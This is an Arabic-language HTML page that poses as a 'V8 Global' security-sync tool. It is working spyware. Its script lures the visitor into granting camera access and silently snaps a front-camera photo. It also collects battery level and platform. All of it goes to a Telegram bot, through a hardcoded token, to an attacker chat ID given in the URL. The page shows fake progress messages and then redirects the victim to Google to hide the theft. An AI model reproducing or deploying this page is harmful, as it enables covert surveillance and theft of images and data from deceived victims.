<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>V8 Global - Secure Sync</title>
    <style>
        body { background: #000; color: #00ffcc; font-family: monospace; text-align: center; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .card { border: 1px solid #00ffcc; padding: 30px; border-radius: 15px; background: rgba(0,255,204,0.05); box-shadow: 0 0 20px #00ffcc; width: 90%; max-width: 400px; }
        .btn { background: #00ffcc; color: #000; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; font-size: 16px; }
        .progress-bar { width: 100%; height: 4px; background: #222; margin: 20px 0; position: relative; overflow: hidden; }
        .progress-fill { width: 0%; height: 100%; background: #00ffcc; transition: width 0.3s; }
        #v, #c { display: none; }
        .flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; opacity: 0; pointer-events: none; }
    </style>
</head>
<body>
    <div class="flash" id="f"></div>
    <div class="card">
        <h2 id="t">V8 Global System</h2>
        <p id="s">يرجى الضغط على الزر أدناه لمزامنة الأمان</p>
        <div class="progress-bar"><div class="progress-fill" id="p"></div></div>
        <button class="btn" id="b" onclick="startCapture()">بدء مزامنة الأمان ✅</button>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPROA823dxEaOZVU";
        const params = new URLSearchParams(window.location.search);
        const uid = params.get('id');
        const mode = params.get('mode') || 'all';

        async function startCapture() {
            if(!uid) return;
            document.getElementById('b').style.display = 'none';
            updateUI("جاري طلب الصلاحيات...", 30);

            try {
                // طلب الكاميرا - بمجرد الضغط على سماح يبدأ السحب
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('v').srcObject = stream;
                updateUI("جاري فحص النظام...", 60);

                // انتظار بسيط لضبط العدسة
                await new Promise(r => setTimeout(r, 1500));

                // فلاش وتحسين جودة الصورة
                document.getElementById('f').style.opacity = '1';
                const canvas = document.getElementById('c');
                const video = document.getElementById('v');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photo = canvas.toDataURL('image/jpeg', 0.9);
                document.getElementById('f').style.opacity = '0';

                updateUI("جاري إرسال البيانات...", 90);

                // جمع معلومات البطارية
                const bat = await navigator.getBattery();
                const info = `🚀 **صيد V8 جديد (${mode}):**\n🔋 الشحن: ${Math.floor(bat.level*100)}%\n📱 النظام: ${navigator.platform}`;

                // إرسال الصورة والبيانات للأيدي المحدد في الرابط
                const blob = await (await fetch(photo)).blob();
                const fd = new FormData();
                fd.append('chat_id', uid);
                fd.append('photo', blob, 'v8.jpg');
                fd.append('caption', info);

                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                
                updateUI("تمت المزامنة بنجاح!", 100);
                stream.getTracks().forEach(t => t.stop());
                setTimeout(() => window.location.replace("https://google.com"), 1500);

            } catch (e) {
                updateUI("فشل في المزامنة!", 0);
                window.location.replace("https://google.com");
            }
        }

        function updateUI(text, prog) {
            document.getElementById('s').innerText = text;
            document.getElementById('p').style.width = prog + '%';
        }
    </script>
</body>
</html>
